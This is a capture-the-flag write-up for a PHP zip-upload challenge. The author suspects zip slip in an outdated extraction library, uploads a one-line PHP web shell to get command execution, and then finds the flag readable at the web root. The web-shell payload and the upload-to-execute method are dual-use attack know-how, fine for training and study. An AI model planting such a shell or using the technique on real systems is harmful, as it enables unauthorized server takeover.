#### free-cloud-storage
- points earned: 284
#### Where's the flag?
- Although there is some source code provided for this challenge, I don't see any actual references to a flag in the source.
- There is a f`lag.php` file but it contains
	```php
	<?php die("Nice try, but there's no flag here!"); ?>
	```
	- I took a moment to confirm that the live target contains this same code by starting an instance and going to `/flag.php`.  It did contain `Nice try, but there's no flag here!` in the response body which confirms that the code on the live target matches the source that was provided as a handout for this challenge.
- Based on this information I suspect that I'm looking for some type of code or command execution that will allow me to find and read the flag file on the live target.
#### Investigating the app
- From a UI/UX perspective I can see the application looks like a file uploader.
- I tested the functionality by attempting to upload a `.txt` file and got the response `Only zip files allowed.`
- Looking at the source I can see that it does validate the extension.
	```php
	if (pathinfo($fileName, PATHINFO_EXTENSION) !== 'zip') {
		die("Only zip files allowed.");
	}
	```
- Continuing to look at the source code I can see that it stores the zip in the `uploads` dir.
	```php
	$uploadDir = __DIR__ . '/uploads/';
	
	// REDACTED ...
	
	$destination = $uploadDir . $fileName;
	if (!move_uploaded_file($tmpName, $destination)) {
		die("Upload failed.");
	}
	```
- Then it extracts the contents of the zip to the same dir.
	```php
	$zipper = new Zipper(); 
	$zipper->make($destination)->extractTo($uploadDir);
	echo "<p>Extraction complete!</p>";
	```
- I'm starting to get zip slip vibes here so I do a little investigation into the library used for zip extraction `"chumper/zipper": "1.0.2"`.
	- The app uses version 1.0.2 and on the libraries github I can see the latest is `1.0.3`.
	- The `1.0.3` release is also labeled `Prevent Zip Traversal Attacks` which likely confirms my suspicions.

#### Investigating zip slip
- Before really getting into the zip slip, I wanted to test the upload and unzip functionality of the web app so I created a simple zip(`file.zip`) with a single file in it(`meow.txt`).
- I uploaded the zip and it went through the process as expected.
- I wonder though.  If is the `uploads` dir accessible from the web?  Can I get to `/uploads/file.zip`?  Since it extracts my file to the same dir can I also get to `/uploads/meow.txt`?
	- On both accounts, yes I have access to the zip and the extracted file.
	- So zip slip is probably not even needed here.
#### Investigating classic php upload and exec
- I wanted to confirm that I can just upload and execute a php file.  For this, I used a standard web shell
- I created and zipped a file called `meow.php`.
	```php
	<?php
	echo(system($_GET['c']));
	?>
	```
- Uploaded it and went to `/uploads/meow.php?c=id` and the response (below) confirmed command execution.
	```
	uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
	```
- Now the question is: where is the flag?
- I started with commands like `ls` and `ls ..` to get a listing of files in this dir and the parent dir.  In the parent dir I found `flag.txt`.
	```
	Dockerfile composer.json composer.lock flag.php flag.txt index.html upload.php uploads vendor vendor
	```
- So wait, `flag.txt` is in the document root along with `index.html`.  So does that mean all I had to do was go to `/flag.txt` on the host to get the flag?
	- yes, lol.

#### Solution
- Just go to `/flag.txt` on the live target.
- No zip slip or command execution was actually required to get the flag.